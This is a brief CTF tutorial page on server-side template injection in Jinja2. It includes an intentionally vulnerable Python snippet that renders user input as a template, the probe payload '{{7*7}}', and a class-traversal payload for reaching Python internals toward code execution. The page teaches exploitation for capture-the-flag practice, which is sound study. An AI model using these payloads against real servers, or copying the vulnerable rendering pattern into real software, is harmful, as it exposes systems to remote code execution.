---
title: "Server-Side Template Injection (SSTI)"
description: "Exploit template engines to inject expressions or execute arbitrary code on vulnerable web servers."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["ssti", "template injection", "jinja2", "web exploitation", "ctf"]
authors: ["CTF.Support Team"]
summary: "Learn to exploit server-side template engines such as Jinja2 or Twig to execute code and extract flags in web CTFs."
aliases: ["/web/ssti/"]
slug: "ssti"
toc: true
---

## Introduction

Server-Side Template Injection (SSTI) occurs when user input is embedded in a template without proper sanitization.
Template engines like **Jinja2** (Python), **Twig** (PHP), or **Velocity** (Java) can then interpret malicious expressions as code.

## Example (Python / Jinja2)

```python
from jinja2 import Template

def render_template(template, **context):
    t = Template(template)
    return t.render(**context)

template = input('Enter a template: ')
context = {'user': 'Alice'}
print(render_template(template, **context))
```

Malicious input:

```python
{{7*7}}
```

Server evaluates and returns:

```text
49
```

## Tips

- Test placeholders: `{{7*7}}` for arithmetic confirmation.
- Find filters or functions: `{{config.__class__.__mro__[1].__subclasses__()}}`.
